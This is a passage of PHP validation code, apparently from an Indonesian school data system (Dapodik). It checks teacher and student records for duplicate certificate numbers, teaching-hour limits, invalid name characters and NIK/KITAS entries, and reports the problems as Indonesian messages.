                                    $alias_column = ucwords(str_replace("_", " ", $tmtPtk['column_name']));
                                    if ($selisihTahun <= 15) {
                                        $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> isian <b>{$alias_column}: {$tglPtk[$tmtPtk['column_name']]}</b> pada <b>{$alias_table}</b> selisih dengan tanggal lahir <b>({$ptk->getTanggalLahir()})</b> dibawah 16 tahun dengan selisih <b>{$selisihTahun} tahun</b>. Harap periksa kembali isian data tsb.";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                        $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "status_kepegawaian_id", $keterangan);
                                    }

                                    // echo "batas atas tmt: ".$batasAtasTmt."<br>";
                                    if ($batasAtasTmt > 0) {
                                        $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> isian <b>{$alias_column}: {$tglPtk[$tmtPtk['column_name']]}</b> pada <b>{$alias_table}</b> tidak wajar dikarenakan lebih dari tahun berjalan. Harap periksa kembali isian data tsb.";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                    }
                                }
                            }
                        }
                    }

                    if ($sekolahObj->getBentukPendidikanId() == 15) {
                        if ($jumlahGtkSertifikasiIndustri < 1) {
                            // SMK Anda belum memiliki guru yg ber sertifikat industri
                            $keterangan = "Terdeteksi bahwa guru di SMK anda belum ada yang mempunyai sertifikat industri";
                            $this->setArrValidation($i++, "ptk", 1, $keterangan);
                        }
                    }

                    // cek nuks dobel
                    // print_r($ptkNuksDobelArr); die;
                    foreach ($ptkNuksDobelArr as $key => $value) {
                        $ptkNuksText = implode(", ", $value);

                        $keterangan = "Terdapat data NUKS <b>".$key."</b> dimiliki lebih dari 1 GTK (<b>{$ptkNuksText}</b>)";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                    }

                    foreach ($ptkNoSerDobelArr as $key => $value) {
                        $ptkDobel = implode(", ", $value);

                        $keterangan = "Terdapat Nomor Sertifikat <b>".$key."</b> pada Sertifikat Pendidik di Rwy. Sertifikasi dimiliki lebih dari 1 GTK (<b>{$ptkDobel}</b>)";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                    }

                    /* foreach ($ptkNrgDobelArr as $key => $value) {
                        $ptkDobel = implode(", ", $value);

                        $keterangan = "Terdapat NRG <b>".$key."</b> pada Sertifikat Pendidik di Rwy. Sertifikasi dimiliki lebih dari 1 GTK (<b>{$ptkDobel}</b>)";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                    } */

                    foreach ($ptkNoPesDobelArr as $key => $value) {
                        $ptkDobel = implode(", ", $value);

                        $keterangan = "Terdapat No Peserta <b>".$key."</b> pada Sertifikat Pendidik di Rwy. Sertifikasi dimiliki lebih dari 1 GTK (<b>{$ptkDobel}</b>)";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                    }

                    if (in_array($sekolahObj->getBentukPendidikanId(), array(13,15)) && $jmlTendik < 1) {
                        $keterangan = "Terdeteksi data tidak wajar, sekolah jenjang SMA/SMK tidak mempunyai Tenaga Kependidikan";
                        $this->setArrValidation($i++, "ptk", 1, $keterangan);
                    }

                    // guru induk minimal harus 12 jam
                    $sql = "select
                                ptk_terdaftar.ptk_terdaftar_id,
                                ptk.ptk_id,
                                ptk.nama,
                                sum(pembelajaran.jam_mengajar_per_minggu) as jjm
                            from pembelajaran
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            where
                                pembelajaran.soft_delete = 0
                                and pembelajaran.mata_pelajaran_id not in ('500050000', '802000300')
                                and ptk_terdaftar.soft_delete = 0
                                and ptk_terdaftar.jenis_keluar_id is null
                                and ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                                and ptk_terdaftar.ptk_induk = 1
                                and ptk_terdaftar.sekolah_id = '{$sekolah_id}'
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and ptk.soft_delete = 0
                                and ptk.jenis_ptk_id not in (20, 5, 14)
                            group by
                                ptk_terdaftar.ptk_terdaftar_id,
                                ptk.ptk_id,
                                ptk.nama
                            having sum(pembelajaran.jam_mengajar_per_minggu) < 12";

                    $datas = getDataBySql($sql, FALSE, DBNAME);

                    foreach ($datas as $data) {
                        $keterangan = "Guru a/n <b>".$data['nama']."</b> minimal harus mengajar disekolah induk sebanyak 12 jam/minggu";
                        $this->setArrValidation($i++, "ptk", 1, $keterangan);
                    }
                }

            } else if ($jenis_validasi == "peserta_didik") {
                // $query = "select count(*)
                //     from peserta_didik a
                //     left join (
                //      select a.anggota_rombel_id, a.peserta_didik_id from anggota_rombel a
                //      join rombongan_belajar b on a.rombongan_belajar_id = b.rombongan_belajar_id
                //      where a.soft_delete = 0
                //      and b.soft_delete = 0
                //      and b.semester_id = '{$sessionSemester}'
                //      and b.sekolah_id = '{$sekolah_id}'
                //     ) b on a.peserta_didik_id = b.peserta_didik_id
                //     left join registrasi_peserta_didik c on a.peserta_didik_id = c.peserta_didik_id
                //     where
                //     c.sekolah_id = '{$sekolah_id}'
                //     and b.peserta_didik_id IS NULL
                //     and c.jenis_keluar_id IS NULL
                //     and a.soft_delete = 0";

                // $countSiswaDiluarRombel = getValueBySql($query, DBNAME);

                // if ($countSiswaDiluarRombel > 0) {
                //     // 17
                //     $keterangan = "Terdapat sejumlah <b>{$countSiswaDiluarRombel}</b> <b>Peserta Didik</b> yg belum masuk ke dalam <b>Rombongan Belajar</b>.";
                //     $this->setArrValidation($i++, "anggota_rombel", 2, $keterangan);

                // }

                $query = "SELECT
                            pd.peserta_didik_id,
                            pd.nama,
                            pd.nisn,
                            rombel.tingkat_pendidikan_id,
                            rombel.jenis_rombel,
                            rombel.nama rombel,
                            rombel.kurikulum_id,
                            pembelajaran.mata_pelajaran_id,
                            matpel.nama matpel,
                            pembelajaran.nama_mata_pelajaran,
                            pembelajaran.jam_mengajar_per_minggu,
                            (case when kurikulum.nama_kurikulum ilike '%2013%' then 1 else 0 end) as is_k13,
                            (case when kurikulum.nama_kurikulum ilike '%REV%' then 1 else 0 end) as is_k13_rev
                        FROM peserta_didik pd
                        JOIN registrasi_peserta_didik reg_pd ON pd.peserta_didik_id = reg_pd.peserta_didik_id
                        JOIN rombongan_belajar rombel ON reg_pd.sekolah_id = rombel.sekolah_id
                        JOIN anggota_rombel angg_rombel ON pd.peserta_didik_id = angg_rombel.peserta_didik_id
                                    AND rombel.rombongan_belajar_id = angg_rombel.rombongan_belajar_id
                        JOIN pembelajaran ON pembelajaran.rombongan_belajar_id = rombel.rombongan_belajar_id
                        JOIN ref.mata_pelajaran matpel ON pembelajaran.mata_pelajaran_id = matpel.mata_pelajaran_id
                        JOIN ref.kurikulum ON rombel.kurikulum_id = kurikulum.kurikulum_id
                        WHERE
                            pd.soft_delete = 0
                            AND reg_pd.soft_delete = 0
                            AND rombel.soft_delete = 0
                            AND angg_rombel.soft_delete = 0
                            AND pembelajaran.soft_delete = 0
                            AND reg_pd.jenis_keluar_id IS NULL
                            AND reg_pd.sekolah_id = '{$sekolah_id}'
                            AND rombel.semester_id = '{$sessionSemester}'
                            AND rombel.jenis_rombel in (1,2,3,11,12,13)
                            AND pembelajaran.status_di_kurikulum in (5,8)
                        ORDER BY
                            pd.peserta_didik_id,
                            rombel.tingkat_pendidikan_id,
                            matpel.mata_pelajaran_id";

                $siswaPeminatan = getDataBySql($query, FALSE, DBNAME);
                // print_r($siswaPeminatan); die;

                foreach ($siswaPeminatan as $value) {
                    $arrNama[$value["peserta_didik_id"]] = array();
                    $arrRombel[$value["peserta_didik_id"]][$value['jenis_rombel']][$value['tingkat_pendidikan_id']][$value["rombel"]] = array();
                    $arrJjmPeminatan[$value["peserta_didik_id"]] += $value["jam_mengajar_per_minggu"];
                }

                foreach ($siswaPeminatan as $value) {

                    if (!in_array($value["nama"], $arrNama[$value["peserta_didik_id"]])) {
                        array_push($arrNama[$value["peserta_didik_id"]], $value["nama"]);
                    }

                    if (!in_array($value["rombel"], $arrRombel[$value["peserta_didik_id"]][$value['jenis_rombel']][$value['tingkat_pendidikan_id']][$value["rombel"]])) {
                        $nama_mata_pelajaran = $value["nama_mata_pelajaran"]." (".$value['jam_mengajar_per_minggu']." jam)";
                        array_push($arrRombel[$value["peserta_didik_id"]][$value['jenis_rombel']][$value['tingkat_pendidikan_id']][$value["rombel"]], $nama_mata_pelajaran);
                    }
                }

                $arrTemp = array();
                foreach ($siswaPeminatan as $value) {

                    $tampil = false;
                    if (!in_array($value['peserta_didik_id'], $arrTemp)) {

                        if ($arrJjmPeminatan[$value['peserta_didik_id']] > 12) {
                            $msg = "Peserta Didik atas nama <b>".$value['nama']."</b> pada ";

                            foreach ($arrRombel[$value['peserta_didik_id']] as $key_jenis_rombel => $val_jenis_rombel) {
                                // echo $key."<br>";
                                $jenis_rombel = ($key_jenis_rombel == 1) ? "Kelas" : "Teori";
                                $msg .= " jenis rombel <b>".$jenis_rombel."</b>";
                                foreach ($val_jenis_rombel as $key_tingkat => $val_tingkat) {
                                    $msg .= " tingkat <b>".$key_tingkat."</b> dengan nama rombel ";
                                    foreach ($val_tingkat as $key_nama_rombel => $val_nama_rombel) {
                                        $nama_matpel = implode(", ", $val_nama_rombel);

                                        if ($sekolahObj->getBentukPendidikanId() == 13) {
                                            if ($value['is_k13'] == 1) {
                                                if ($key_tingkat == 10 && $arrJjmPeminatan[$value['peserta_didik_id']] > 18) {
                                                    $tampil = true;
                                                    $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMA Kurikulum 2013 batas maksimum peminatan/lintas minat utk tingkat ".$key_tingkat." yaitu 18jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                } else if ($key_tingkat > 10 && $arrJjmPeminatan[$value['peserta_didik_id']] > 20) {
                                                    $tampil = true;
                                                    $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMA Kurikulum 2013 batas maksimum peminatan/lintas minat utk tingkat ".$key_tingkat." yaitu 20jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                }
                                            } else {
                                                if ($key_tingkat == 10 && $arrJjmPeminatan[$value['peserta_didik_id']] > 0){
                                                    $tampil = true;
                                                    $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMA kurikulum KTSP untuk tingkat ".$key_tingkat." tidak ada peminatan (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                } else if ($key_tingkat > 10 && $arrJjmPeminatan[$value['peserta_didik_id']] > 12) {
                                                    $tampil = true;
                                                    $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMA kurikulum KTSP batas maksimum peminatan utk tingkat ".$key_tingkat." yaitu 12jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                }
                                            }
                                        } else if ($sekolahObj->getBentukPendidikanId() == 15) {
                                            if ($value['is_k13'] == 1) {
                                                if ($value['is_k13_rev'] == 1) {
                                                    if ($value['tingkat_pendidikan_id'] == 10 && $arrJjmPeminatan[$value['peserta_didik_id']] > 22) {
                                                        if ($value['kurikulum_id'] == 334) {
                                                            // 334 - SMK 2013 REV.  Pelayaran Kapal Penangkap Ikan
                                                            if ($arrJjmPeminatan[$value['peserta_didik_id']] > 23) {
                                                                $tampil = true;
                                                                $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum 2013 REV batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 23jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";    
                                                            }
                                                        } else {
                                                            $tampil = true;
                                                            $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum 2013 REV batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 22jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                        }
                                                    } else if ($value['tingkat_pendidikan_id'] == 11 && $arrJjmPeminatan[$value['peserta_didik_id']] > 31) {
                                                        $tampil = true;
                                                        $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum 2013 REV batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 31jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                    } else if ($value['tingkat_pendidikan_id'] == 12 && $arrJjmPeminatan[$value['peserta_didik_id']] > 33) {
                                                        $tampil = true;
                                                        $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum 2013 REV batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 33jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                    } else if ($value['tingkat_pendidikan_id'] == 13 && $arrJjmPeminatan[$value['peserta_didik_id']] > 44) {
                                                        $tampil = true;
                                                        $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum 2013 REV batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 44jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                    }
                                                } else {
                                                    if ($arrJjmPeminatan[$value['peserta_didik_id']] > 24) {
                                                        $tampil = true;
                                                        $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum 2013 batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 24jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                    }
                                                }
                                            } else {
                                                if ($arrJjmPeminatan[$value['peserta_didik_id']] > 26) {
                                                    $tampil = true;
                                                    $msg .= "<b>".$key_nama_rombel."</b> ( ".$nama_matpel." ) sesuai SMK Kurikulum KTSP batas maksimum matpel kejuruan utk tingkat ".$key_tingkat." yaitu 26jam/minggu (saat ini ".$arrJjmPeminatan[$value['peserta_didik_id']]."jam/minggu)";
                                                }
                                            }
                                        }
                                    }
                                }

                                $msg .= ", ";
                            }

                            if ($tampil) {
                                $keterangan = $msg;
                                $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                            }
                        }

                        array_push($arrTemp, $value['peserta_didik_id']);
                    }
                }

                // Peserta Didik
                $c = new \Criteria();
                $c->addJoin(PesertaDidikPeer::PESERTA_DIDIK_ID, RegistrasiPesertaDidikPeer::PESERTA_DIDIK_ID, \Criteria::LEFT_JOIN);
                $c->add(RegistrasiPesertaDidikPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);
                $c->add(RegistrasiPesertaDidikPeer::SOFT_DELETE, 0);
                $c->add(RegistrasiPesertaDidikPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(PesertaDidikPeer::SOFT_DELETE, 0);

                $siswas = PesertaDidikPeer::doSelect($c);
                $count = sizeof($siswas);

                $nipdArr = array();

                if ($count < 1) {
                    $keterangan = "Data Peserta Didik Kosong";
                    $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                } else {

                    $sql = "SELECT
                                pd.peserta_didik_id,
                                pd.nama,
                                rb.nama nama_rombel,
                                js.nama_jurusan_sp
                            FROM anggota_rombel ar
                            JOIN rombongan_belajar rb ON ar.rombongan_belajar_id = rb.rombongan_belajar_id
                            JOIN peserta_didik pd ON ar.peserta_didik_id = pd.peserta_didik_id
                            JOIN registrasi_peserta_didik rpd ON ar.peserta_didik_id = rpd.peserta_didik_id
                            JOIN sekolah s ON rpd.sekolah_id = s.sekolah_id
                            JOIN jurusan_sp js ON s.sekolah_id = js.sekolah_id
                            WHERE
                                ar.soft_delete = 0
                                AND ar.jenis_pendaftaran_id = 1
                                AND rb.semester_id = '{$sessionSemester}'
                                AND rb.sekolah_id = rpd.sekolah_id
                                AND rb.soft_delete = 0
                                AND rb.jenis_rombel in (1,8,9,10,11,12,13)
                                AND rb.tingkat_pendidikan_id NOT IN (1, 7, 10)
                                AND pd.soft_delete = 0
                                AND rpd.soft_delete = 0
                                AND rpd.jenis_keluar_id IS NULL
                                AND s.sekolah_id = '{$sekolah_id}'
                                AND s.bentuk_pendidikan_id NOT IN (7, 8, 14, 29)
                                AND js.soft_delete = 0";

                    $siswaNyeleneuh = getDataBySql($sql, FALSE, DBNAME);

                    $siswaNyeleneuhArr = array();
                    foreach ($siswaNyeleneuh as $value) {
                        $siswaNyeleneuhArr[$value['peserta_didik_id']] = $value;
                    }

                    // print_r($siswaNyeleneuhArr); die;
                    $sql = "select
                                anggota_rombel.peserta_didik_id,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama as nama_rombel
                            from anggota_rombel
                            join rombongan_belajar on anggota_rombel.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            where 
                                anggota_rombel.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'";
                    $siswaRombel = getDataBySql($sql, FALSE, DBNAME);

                    $siswaRombelArr = array();
                    foreach ($siswaRombel as $sis) {
                        $arr['peserta_didik_id'] = $sis['peserta_didik_id'];
                        $arr['tingkat_pendidikan_id'] = $sis['tingkat_pendidikan_id'];
                        $arr['nama_rombel'] = $sis['nama_rombel'];

                        $siswaRombelArr[$sis['peserta_didik_id']] = $arr;
                    }

                    // print_r($siswaRombelArr); die;
                    if (count($siswas) < 60) {
                        $keterangan = "Terdeteksi jumlah peserta didik keseluruhan hanya ".count($siswas)." jiwa. (SE Dirjen tentang Kualitas Data Dapodik)";
                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                    }

                    $n = 0;
                    $siswaMemilikiKebutuhanKhusus = 0;
                    $siswaTinggalDiAsrama = 0;

                    $pattern = "/^[a-zA-Z ',.-]*$/i";
                    foreach ($siswas as $siswa) {
                        $n++;
                        // cek registrasi peserta didik
                        $c = new \Criteria();
                        $c->add(RegistrasiPesertaDidikPeer::SEKOLAH_ID, $sekolah_id);
                        $c->add(RegistrasiPesertaDidikPeer::PESERTA_DIDIK_ID, $siswa->getPesertaDidikId());
                        $c->add(RegistrasiPesertaDidikPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);
                        $c->add(RegistrasiPesertaDidikPeer::SOFT_DELETE, 0);
                        $countRegs = RegistrasiPesertaDidikPeer::doCount($c);
                        $regPd = RegistrasiPesertaDidikPeer::doSelectOne($c);

                        if ($countRegs < 1) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> belum terdaftar. Perbaiki dengan tombol <b>Registrasi</b>";
                            $this->setArrValidation($i++, "registrasi_peserta_didik", 2, $keterangan);
                            continue;
                        }

                        if (array_key_exists($siswa->getPesertaDidikId(), $siswaRombelArr)) {
                            if ((!$regPd->getNipd() or empty($regPd->getNipd())) && in_array($siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'], array(6,9,12))) {
                                $tingkat_pendidikan_id = $siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'];
                                $nama_rombel = $siswaRombelArr[$siswa->getPesertaDidikId()]['nama_rombel'];

                                $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> telah berada pada tingkat akhir dengan rombel <b>{$tingkat_pendidikan_id} - {$nama_rombel}</b> namun belum memiliki NIS/NIPD";
                                $this->setArrValidation($i++, "registrasi_peserta_didik", 2, $keterangan);
                            }
                        }

                        $month = (int) date('m', strtotime($regPd->getTanggalMasukSekolah()));
                        // echo $month; die;
                        if ($regPd->getJenisPendaftaranId() == 1 && $month < 6 && !in_array($sekolahObj->getBentukPendidikanId(), array(7,8,14,29))) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> jenis pendaftaran sebagai <b>Siswa Baru</b>, namun tanggal masuk sekolah tidak sesuai dengan kalender akademik periode aktif (Tgl Masuk: ".$regPd->getTanggalMasukSekolah().")";
                            $this->setArrValidation($i++, "registrasi_peserta_didik", 2, $keterangan);
                        }

                        // cek No SKHUN utk SMP
                        if (in_array($sekolahObj->getBentukPendidikanId(), $smp)) {
                            $valKkPd = 0;

                            if (!$regPd->getNoPesertaUjian()) {
                                if ($sekolahObj->getBentukPendidikanId() != 6) {
                                    if ($siswa->getKebutuhanKhususId()) {
                                        $kk = $siswa->getKebutuhanKhususRelatedByKebutuhanKhususId();

                                        $kk_c = is_object($kk) ? $kk->getKkC() : 0;
                                        $kk_c1 = is_object($kk) ? $kk->getKkC1() : 0;

                                        if ($kk_c < 1 || $kk_c1 < 1) {
                                            $valKkPd = 0;
                                        }
                                    } else {
                                        $valKkPd = 1;
                                    }
                                } else {
                                    $valKkPd = 1;
                                }

                                $bentukPendidikanNama = $sekolahObj->getBentukPendidikan()->getNama();
                                if ($valKkPd == 1) {
                                    $keterangan = "Peserta Didik jenjang <b>{$bentukPendidikanNama}</b>, a/n <b>{$siswa->getNama()}</b> wajib mengisikan <b>No Peserta UN</b>";
                                    $this->setArrValidation($i++, "peserta_didik_longitudinal", 1, $keterangan);
                                }
                            }
                        }
                        

                        // cek nama valid
                        $matches_namapd = !preg_match($pattern, $siswa->getNama());
                        $matches_namaibupd = !preg_match($pattern, $siswa->getNamaIbuKandung());
                        if ($matches_namapd) {
                            // $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> terdapat huruf yang tidak diperkenankan. Huruf yang diperkenankan hanyalah [ <b>a-zA-Z '.-</b> ])";
                            $keterangan = "Terdapat kesalahan dalam penulisan nama peserta didik a/n <b>".$siswa->getNama()."</b>. Huruf yang diperkenankan hanyalah [ <b>a-zA-Z ',.-</b> ])";
                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);

                            // trigger vld pd
                            $this->setTriggerValidation($app, "peserta_didik", $siswa->getPesertaDidikId(), "nama", "Terdeteksi nama tidak wajar");
                            /*$c = new \Criteria();
                            $c->add(VldPesertaDidikPeer::PESERTA_DIDIK_ID, $siswa->getPesertaDidikId());
                            $c->add(VldPesertaDidikPeer::SOFT_DELETE, 0);
                            $c->add(VldPesertaDidikPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
                            $c->add(VldPesertaDidikPeer::FIELD_ERROR, "nama");
                            $vldPdObj = VldPesertaDidikPeer::doSelectOne($c);

                            if (!is_object($vldPdObj)) {
                                $uuid = pg_gen_uuid(VldPesertaDidikPeer::DATABASE_NAME);
                                $vldPdObj = new VldPesertaDidik();
                                $vldPdObj->setLogid($uuid);
                                $vldPdObj->setCreateDate(getCreateDate($vldPdObj->getLastSync(), $app));
                            }
                            $vldPdObj->setStatusValidasi(1);
                            $vldPdObj->setPesertaDidikId($siswa->getPesertaDidikId());
                            $vldPdObj->setIdtype(3001);
                            $vldPdObj->setFieldError("nama");
                            $vldPdObj->setErrorMessage('Terdeteksi nama tidak wajar');
                            $vldPdObj->setAppUsername("validation_trigger");
                            $vldPdObj->setSoftDelete(0);
                            $vldPdObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
                            $vldPdObj->setLastUpdate(getLastUpdate($vldPdObj->getLastSync(), $app));
                            $vldPdObj->setLastSync(getLastSync($vldPdObj->getLastSync(), $app));
                            $vldPdObj->save();*/
                        }

                        if ($matches_namaibupd || strlen(str_replace(" ", "", $siswa->getNamaIbuKandung())) <= 1) {
                            // $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> terdapat huruf yang tidak diperkenankan. Huruf yang diperkenankan hanyalah [ <b>a-zA-Z '.-</b> ])";
                            $keterangan = "Terdapat kesalahan dalam penulisan nama ibu kandung peserta didik a/n <b>".$siswa->getNama()."</b> ({$siswa->getNamaIbuKandung()}). Huruf yang diperkenankan hanyalah [ <b>a-zA-Z ',.-</b> ])";
                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);

                            // trigger vld pd
                            $this->setTriggerValidation($app, "peserta_didik", $siswa->getPesertaDidikId(), "nama_ibu_kandung", "Terdeteksi nama ibu kandung tidak wajar");
                            /*$c = new \Criteria();
                            $c->add(VldPesertaDidikPeer::PESERTA_DIDIK_ID, $siswa->getPesertaDidikId());
                            $c->add(VldPesertaDidikPeer::SOFT_DELETE, 0);
                            $c->add(VldPesertaDidikPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
                            $c->add(VldPesertaDidikPeer::FIELD_ERROR, "nama_ibu_kandung");
                            $vldPdObj = VldPesertaDidikPeer::doSelectOne($c);

                            if (!is_object($vldPdObj)) {
                                $uuid = pg_gen_uuid(VldPesertaDidikPeer::DATABASE_NAME);
                                $vldPdObj = new VldPesertaDidik();
                                $vldPdObj->setLogid($uuid);
                                $vldPdObj->setCreateDate(getCreateDate($vldPdObj->getLastSync(), $app));
                            }
                            $vldPdObj->setStatusValidasi(1);
                            $vldPdObj->setPesertaDidikId($siswa->getPesertaDidikId());
                            $vldPdObj->setIdtype(3001);
                            $vldPdObj->setFieldError("nama_ibu_kandung");
                            $vldPdObj->setErrorMessage('Terdeteksi nama ibu kandung tidak wajar');
                            $vldPdObj->setAppUsername("validation_trigger");
                            $vldPdObj->setSoftDelete(0);
                            $vldPdObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
                            $vldPdObj->setLastUpdate(getLastUpdate($vldPdObj->getLastSync(), $app));
                            $vldPdObj->setLastSync(getLastSync($vldPdObj->getLastSync(), $app));
                            $vldPdObj->save();*/
                        }
                        
                        $c = new \Criteria();
                        $c->add(KesejahteraanPdPeer::PESERTA_DIDIK_ID, $siswa->getPesertaDidikId());
                        $c->add(KesejahteraanPdPeer::SOFT_DELETE, 0);
                        $kesejahteraanPdObj = KesejahteraanPdPeer::doSelect($c);
                        
                        $jmlPip = 0;
                        $jmlPkh - 0;
                        $jmlKps = 0;
                        $jmlKks = 0;
                        $jmlKis = 0;
                        foreach ($kesejahteraanPdObj as $kesejahteraanPd) {
                            if ($kesejahteraanPd->getJenisKesejahteraanId() == 11) {
                                $jmlPip++;
                            } elseif ($kesejahteraanPd->getJenisKesejahteraanId() == 12) {
                                $jmlPkh++;
                            } elseif ($kesejahteraanPd->getJenisKesejahteraanId() == 13) {
                                $jmlKps++;
                            } elseif ($kesejahteraanPd->getJenisKesejahteraanId() == 14) {
                                $jmlKks++;
                            } elseif ($kesejahteraanPd->getJenisKesejahteraanId() == 15) {
                                $jmlKis++;
                            }
                        }

                        // cek individual
                        if ($siswa->getAgama()->getExpiredDate()) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> memilih agama yang sudah tidak aktif.";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        }

                        if ($siswa->getNik()) {
                            $cekNik = $siswa->getNik();
                        } else {
                            $cekNik = "Tidak diisi";
                        }

                        if ($siswa->getKewarganegaraan() != "ID") {
                            $nik_num = trim($siswa->getNik());
                            $maxNik = 11;
                            $namaNik = "No KITAS";
                        } else {
                            $nik_new = str_replace("0000000", "", $siswa->getNik());
                            $nik_num = preg_replace("/[^0-9]+/", "", $nik_new);
                            $maxNik = 16;
                            $namaNik = "NIK";
                        }

                        if (array_key_exists($siswa->getPesertaDidikId(), $siswaRombelArr)) {
                            // if (in_array($siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'], array(3,6,9,12,13))) {

                                $tingkat_pendidikan_id = $siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'];
                                $nama_rombel = $siswaRombelArr[$siswa->getPesertaDidikId()]['nama_rombel'];

                                /* if (
                                    ($siswa->getKewarganegaraan() == "ID" && strlen($nik_num) != $maxNik)
                                    || 
                                    ($siswa->getKewarganegaraan() != "ID" && !empty($nik_num))
                                 ) { */
                                if ($siswa->getKewarganegaraan() == "ID") {
                                    if (strlen($nik_num) != $maxNik) {
                                        $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> harap mengisikan {$namaNik} <b>(Isian saat ini:{$cekNik})</b> dengan benar <b>(Rombel saat ini: {$tingkat_pendidikan_id} - {$nama_rombel})</b>";
                                        if (!in_array($kodeProp, $prop3T)) {
                                            // echo substr($sekolahObj->getKodeWilayah(), 0, 2); die;
                                            if (in_array($siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'], array(3,6,9,12,13))) {
                                                if ($siswa->getJenisTinggalId() == 5) {
                                                    // tinggal di panti asuhan
                                                    $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                                } else {
                                                    $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                                                }
                                            } else {
                                                $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                            }
                                        } else {
                                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                        }
                                    }
                                } else {
                                    $c = new \Criteria();
                                    $c->add(KitasPdPeer::PESERTA_DIDIK_ID, $siswa->getPesertaDidikId());
                                    $c->add(KitasPdPeer::SOFT_DELETE, 0);
                                    $jmlKitasPd = KitasPdPeer::doCount($c);

                                    if ($jmlKitasPd < 1) {
                                        $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> harap mengisikan No KITAS dikarenakan Warga Negara Asing (WNA)";
                                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                    }
                                }

